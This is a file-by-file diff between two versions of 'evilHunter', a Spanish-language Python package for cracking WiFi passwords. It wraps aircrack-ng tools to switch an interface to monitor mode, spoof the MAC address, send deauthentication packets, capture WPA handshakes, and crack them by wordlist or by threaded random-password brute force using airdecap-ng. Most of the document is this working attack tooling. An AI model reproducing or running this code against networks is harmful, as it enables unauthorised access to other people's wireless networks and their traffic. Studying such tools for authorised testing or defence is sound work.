# Comparing `tmp/evilHunter-0.1.85.tar.gz` & `tmp/evilHunter-0.1.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.85.tar", last modified: Tue Jun 13 16:49:17 2023, max compression
+gzip compressed data, was "evilHunter-0.1.9.tar", last modified: Thu Jun 15 12:23:22 2023, max compression
```

## Comparing `evilHunter-0.1.85.tar` & `evilHunter-0.1.9.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-13 16:49:17.571748 evilHunter-0.1.85/
--rw-r--r--   0 root         (0) root         (0)     2261 2023-06-13 16:49:17.571748 evilHunter-0.1.85/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)     2027 2023-06-12 10:31:03.000000 evilHunter-0.1.85/README.md
--rw-r--r--   0 root         (0) root         (0)     3875 2023-06-12 12:54:22.000000 evilHunter-0.1.85/evilCracker.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-13 16:49:17.571748 evilHunter-0.1.85/evilHunter.egg-info/
--rw-r--r--   0 root         (0) root         (0)     2261 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      216 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       35 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/requires.txt
--rw-r--r--   0 root         (0) root         (0)        6 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)    21208 2023-06-12 21:32:33.000000 evilHunter-0.1.85/evilHunter.py
--rw-r--r--   0 root         (0) root         (0)       38 2023-06-13 16:49:17.571748 evilHunter-0.1.85/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      610 2023-06-13 16:48:42.000000 evilHunter-0.1.85/setup.py
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-15 12:23:22.943486 evilHunter-0.1.9/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     2272 2023-06-15 12:23:22.943486 evilHunter-0.1.9/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     2039 2023-06-15 11:42:59.000000 evilHunter-0.1.9/README.md
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     4202 2023-06-15 11:36:46.000000 evilHunter-0.1.9/evilCracker.py
+drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-15 12:23:22.943486 evilHunter-0.1.9/evilHunter.egg-info/
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)     2272 2023-06-15 12:23:22.000000 evilHunter-0.1.9/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      216 2023-06-15 12:23:22.000000 evilHunter-0.1.9/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-15 12:23:22.000000 evilHunter-0.1.9/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)       35 2023-06-15 12:23:22.000000 evilHunter-0.1.9/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-15 12:23:22.000000 evilHunter-0.1.9/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)    21218 2023-06-15 11:39:23.000000 evilHunter-0.1.9/evilHunter.py
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-15 12:23:22.943486 evilHunter-0.1.9/setup.cfg
+-rw-r--r--   0 supervisor  (1000) supervisor  (1000)      609 2023-06-15 11:42:59.000000 evilHunter-0.1.9/setup.py
```

### Comparing `evilHunter-0.1.85/PKG-INFO` & `evilHunter-0.1.9/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.85
+Version: 0.1.9
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
@@ -45,19 +45,20 @@
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
     de herramientas de 'aircrack-ng' y ' macchanger
-        -  macchanger
-        -  airmon-ng
-        -  aircrack-ng
-        -  aireplay-ng
-        -  airodump-ng
+
+        -   macchanger
+        -   aircrack-ng
+        -   airodump-ng
+        -   aireplay-ng
+        -   airmon-ng
     
 # Install Tools
     ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
     └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
 
                
 # DICCIONARIO:
@@ -75,17 +76,17 @@
                 · Cifrado
                 · BSSID
                 · Canal/Channel
                 · ESSID/NOMBRE DE RED
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
-        red en el mismo cana, enviamos paquetes de deautenticación 
+        red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) Faster
+                [♦]  Brute Force (Password Generator) more Faster
                 [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.85/README.md` & `evilHunter-0.1.9/README.md`

 * *Files 2% similar despite different names*

```diff
@@ -36,19 +36,20 @@
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
     de herramientas de 'aircrack-ng' y ' macchanger
-        -  macchanger
-        -  airmon-ng
-        -  aircrack-ng
-        -  aireplay-ng
-        -  airodump-ng
+
+        -   macchanger
+        -   aircrack-ng
+        -   airodump-ng
+        -   aireplay-ng
+        -   airmon-ng
     
 # Install Tools
     ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
     └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
 
                
 # DICCIONARIO:
@@ -66,17 +67,17 @@
                 · Cifrado
                 · BSSID
                 · Canal/Channel
                 · ESSID/NOMBRE DE RED
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
-        red en el mismo cana, enviamos paquetes de deautenticación 
+        red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) Faster
+                [♦]  Brute Force (Password Generator) more Faster
                 [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.85/evilCracker.py` & `evilHunter-0.1.9/evilCracker.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,116 +1,124 @@
 #!/bin/python3
-
+import os
 
 # Funciona
 try:
     import subprocess
     import random
     import string
+    import re
     import threading
     import concurrent.futures
     import time
     from datetime import datetime
     import colorama
     from colorama import Fore
     from concurrent.futures import ThreadPoolExecutor
     from tqdm import tqdm
+    #from evilHunter import exiting
     colorama.init()
 except ModuleNotFoundError as e:
     print("[!] Faltan Modulos...\n", e)
 
 tries = 0
 tried = []
 password_found = threading.Event()
-ex = threading.Event()
 
 # Generar una contraseña aleatoria
 
 
 def generate_password(length):
     global tries
     long = [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     if length == "r":
         length = random.choice(long)
 
     characters = string.ascii_letters + string.digits
     password = ''.join(random.choice(characters) for _ in range(length))
 
     while password in tried:
-        print("a")
         password = ''.join(random.choice(characters) for _ in range(length))
 
     tried.append(password)
     tries += 1
     return password, tries
 
 
-def brute_force(progress_bar, file, long):
+def brute_force(progress_bar, file, long, network_to_attack):
+    global found
     found = False
 # not found and
     # Intentar descifrar el handshake con diferentes contraseñas generadas
-    while not password_found.is_set():
+    while not password_found.is_set() and not found:
 
         password, num = generate_password(long)
+
         progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
                                      Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
                                      + Fore.RESET)
 
-        # Ejecutar aircrack-ng con la contraseña generada
-        command = f"aircrack-ng -w - -b E4:AB:89:1F:57:4E {file}"
-        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE, encoding="utf-8")
-        output = process.communicate(password)[0]
-
-        # Verificar si se encontró la contraseña
-        if "KEY FOUND" in output:
-            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + f"Contraseña encontrada: {password}\n")
+        command = subprocess.Popen(
+            ["airdecap-ng", "-p", password, "-e", network_to_attack, file],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = command.communicate()[0]
+
+        dec_pkts = re.search(r"Number of decrypted WPA  packets\s+(\d+)", output.decode())
+        dec_pkts = int(dec_pkts.group(1))
+
+        if dec_pkts > 0:
+            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + "Contraseña encontrada: " + Fore.LIGHTYELLOW_EX + f"{password}\n")
+            print(Fore.GREEN + "\n\n\t[+] " + Fore.BLUE + "Decrypted packets: " + Fore.LIGHTYELLOW_EX + f"{dec_pkts}\n")
             found = True
             password_found.set()
 
 
-def startbrute(file, length, threads):
+def startbrute(file, length, threads, network_to_attack):
     start_time = datetime.now()
-    main(file, length, threads)
+    main(file, length, threads, network_to_attack)
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start_time)
 
 
-def main(file, long, threads):
+def main(file, long, threads, network_to_attack):
 
     try:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Starting brute force...\n" + Fore.RESET)
         time.sleep(0.5)
         print(Fore.YELLOW + "\n\t[+] " + Fore.BLUE + "Preparing threads...\n" + Fore.RESET)
         time.sleep(0.5)
         print(Fore.YELLOW + "\n[*] " + Fore.GREEN + "DONE! Starting...\n" + Fore.RESET)
         time.sleep(0.5)
-        stop = threading.Event()
+        threads = int(threads)
+
         with ThreadPoolExecutor(max_workers=threads) as executor:
             # Lista de tareas
             futures = []
             progress_bar = tqdm(total=0)
 
             for i in range(threads):
-                future = executor.submit(brute_force, progress_bar, file, long)
+                future = executor.submit(brute_force, progress_bar, file, long, network_to_attack)
                 future.deamon = True
                 futures.append(future)
 
+        concurrent.futures.wait(futures)
+
     except KeyboardInterrupt:
         print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\n\n\tStopping threads, wait in "
                                                                                    "process...\n\n")
         progress_bar.close()
         password_found.set()
+        found = "Fake"
 
         # Cancelamos todos los hilos/tareas
         for future in futures:
             future.cancel()
 
         # Esperamos a todos los hilos detenidos
         concurrent.futures.wait(futures)
 
-        exit(0)
 
 
 if __name__ == "__main__":
     start = datetime.now()
-    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500)
+    print()
+    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500, network_to_attack=input("SSID Name -> "))
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
```

### Comparing `evilHunter-0.1.85/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.9/evilHunter.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.85
+Version: 0.1.9
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
@@ -45,19 +45,20 @@
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
     de herramientas de 'aircrack-ng' y ' macchanger
-        -  macchanger
-        -  airmon-ng
-        -  aircrack-ng
-        -  aireplay-ng
-        -  airodump-ng
+
+        -   macchanger
+        -   aircrack-ng
+        -   airodump-ng
+        -   aireplay-ng
+        -   airmon-ng
     
 # Install Tools
     ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
     └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
 
                
 # DICCIONARIO:
@@ -75,17 +76,17 @@
                 · Cifrado
                 · BSSID
                 · Canal/Channel
                 · ESSID/NOMBRE DE RED
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
-        red en el mismo cana, enviamos paquetes de deautenticación 
+        red en el mismo canal, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
         con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) Faster
+                [♦]  Brute Force (Password Generator) more Faster
                 [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.85/evilHunter.py` & `evilHunter-0.1.9/evilHunter.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,9 @@
 #!/bin/python3
 
-
 try:
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
     import string
     import re
     import colorama
     from colorama import Fore
@@ -42,21 +41,21 @@
 def stop_monitoring():
     if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
         os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
 
 
 def exiting(err):
     if err:
-        if err == True:
+        if err is True:
             print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)
 
         elif err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
-        elif err == False:
+        elif err is False:
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
     elif not err:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
     print(
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
@@ -68,15 +67,18 @@
         + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
                         Fore.LIGHTCYAN_EX + "Restarting network services")
 
     try:
         stop_monitoring()
     except NameError:
         pass
-    restore_mac()
+    try:
+        restore_mac()
+    except NameError:
+        pass
 
     print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
     delete_files()
     restart_net()
 
     print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
@@ -128,14 +130,16 @@
     else:
         non_installed["aireplay-ng"] = True
 
     if os.system('command -v airodump-ng > /dev/null') != 0:
         non_installed["airodump-ng"] = False
     else:
         non_installed["airodump-ng"] = True
+    if os.system('command -v airdecap-ng > /dev/null') != 0:
+        non_installed["airdecap-ng"] = False
     if os.system("command -v macchanger > /dev/null") != 0:
         non_installed["macchanger"] = False
     else:
         non_installed["macchanger"] = True
 
     for tool in non_installed:
         time.sleep(0.4)
@@ -143,15 +147,14 @@
         if tool in ["aireplay-ng", "airodump-ng", "airmon-ng"]:
             if not non_installed[tool]:
                 print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                       "La herramienta " + Fore.GREEN + "aircrack-ng" + Fore.LIGHTCYAN_EX +
                       " no está instalada correctamente...")
                 exit(1)
 
-
         elif not non_installed[tool]:
             print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")
 
         elif non_installed[tool]:
             print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX +
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
@@ -265,15 +268,14 @@
     else:
         print(Fore.RED + "\n\t[" + Fore.YELLOW + "V" + Fore.RED + "] " + Fore.YELLOW +
               "La interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
               " no se ha establecido en modo monitor correctamente...")
         exiting(err=True)
         prepared = False
 
-
     if prepared:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")
 
 
 def get_options(args):
     hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)
 
@@ -441,45 +443,51 @@
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
         print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
-    crack_handshake(direc, args, file)
+    crack_handshake(direc, args, file, network_to_attack)
 
 
 def find_wordlists(wordlists):
     found = os.system("find {} > /dev/null".format(wordlists))
     while found != 0:
         print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
         wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
         found = os.system("find {}  > /dev/null".format(wordlists))
 
     return wordlists
 
 
-def crack_handshake(direc, args, file):
+def crack_handshake(direc, args, file, network_to_attack):
     # Buscamos arhchivo .cap
     os.system("find {}/{}*.cap > espec/capture_file ".format(direc, file))
 
     # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
     with open("espec/capture_file", "r") as file:
         file = file.read().strip()
 
     # Comprobamos si nos ha pasasdo discionario y si existe en su sistema o si quiere brute
     if args.wordlist:
         wordlist = find_wordlists(args.wordlist)
 
     elif args.brute:
         if args.threads:
-            evilCracker.startbrute(file, args.brute, args.threads)
+            fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, args.threads, network_to_attack))
+            fnd.start()
         else:
-            evilCracker.startbrute(file, args.brute, 500)
-        exiting(err="done")
+            fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, 500, network_to_attack))
+            fnd.start()
+
+        if fnd == 0:
+            exiting(err="done")
+        else:
+            exiting(err=False)
 
     print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
     # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
     time.sleep(3)
 
     # Empezamos con el crack de la password
     crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE)
@@ -502,17 +510,17 @@
         os.system("clear")
         print(Fore.RED + "\n\n[!] " + Fore.LIGHTYELLOW_EX + "La clave no se ha encontrado...")
         print(Fore.LIGHTCYAN_EX + "\n\t[*] " + Fore.LIGHTYELLOW_EX + "Quieres probar un ataque de fuerza bruta? ")
         s = input("\n\t\t[S/N] -> ")
 
         if s.lower() == "s":
             if args.threads:
-                evilCracker.startbrute(file, "r", args.threads)
+                evilCracker.startbrute(file, "r", args.threads, network_to_attack)
             else:
-                evilCracker.startbrute(file, "r", 200)
+                evilCracker.startbrute(file, "r", 200, network_to_attack)
         else:
             exiting(err='done')
 
 
 def main():
     try:
         # Recogemos argumentos
@@ -520,15 +528,16 @@
         
         # Argumento de diccionario
         parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  "
                                                      "USAGE:  -w /path/to/dict\n", required=False)
         
         # Argumento de fuerza bruta
         parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b "
-                                                  "[length passwords / r (random)] E.j: -b 12 ", required=False)
+                                                  "[length passwords / r (random)] E.j: -b 12 ",
+                            required=False)
         
         # Argumento de hilos
         parser.add_argument("-t", "--threads", help="Specify the number of threads", required=False)
         
         args = parser.parse_args()
 
         # Checkeamos argumentos que estén bien...
@@ -536,48 +545,42 @@
             print(Fore.RED + "[!] ERROR: " + 
                   Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
             exit(1)
 
         elif args.brute:
 
             if args.threads:
-                for num in args.threads:
-                    try:
-                        num = int(num)
-                    except ValueError:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
-                        exit(1)
-
-                    if num > 501:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
-                                                                        "de hilos a usar entre 20 a 500...")
-                        exit(1)
-                    elif num < 20:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
-                                                                        "de hilos a usar entre 20 a 500...")
-                        exit(1)
+                try:
+                    num = int(args.threads)
+                except ValueError:
+                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
+                    exit(1)
+
+                if num > 500 or num < 20:
+                    print(num)
+                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
+                                                                    "entre 20-500...")
+                    exit(1)
 
             if args.brute != "r":
                 for num in args.brute:
                     if num not in string.digits:
                         print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el largo de "
                                                                         "las contraseñas o 'r' para random length")
                         exit(1)
 
-
         # Somos root?
         am_i_root()
 
         # Carpetas necesarias
         if not os.path.exists("captures"):
             os.makedirs("captures")
             os.system('chmod 777 captures')
         if not os.path.exists("espec"):
             os.makedirs("espec")
-            os.system('chown root:supervisor espec')
             os.system('chmod 777 espec')
 
         # Tenemos las herraientas?
         check_utilities()
 
         # Listamos interfaces
         list_save_interf()
@@ -588,14 +591,12 @@
         # Borramos datos
         exiting(err="done")
 
     # Salida manual
     except KeyboardInterrupt:
         exiting(err=False)
 
-    # Salida por error
-    except Exception as e:
-        exiting(err=e)
+
 
 
 if __name__ == "__main__":
     main()
```

### Comparing `evilHunter-0.1.85/setup.py` & `evilHunter-0.1.9/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup
 
 with open("README.md", "r", encoding="utf-8") as fh:
     long_description = fh.read()
 
 setup(
     name="evilHunter",
-    version="0.1.85",
+    version="0.1.9",
     description="Cracking WiFi(Hanshake)",
     long_description=long_description,
     long_description_content_type="text/markdown",
     author="an0mal1a",
     url="https://github.com/an0mal1a/evilHunter",
     author_email="pablodiez024@proton.me",
     packages=["words"],
```

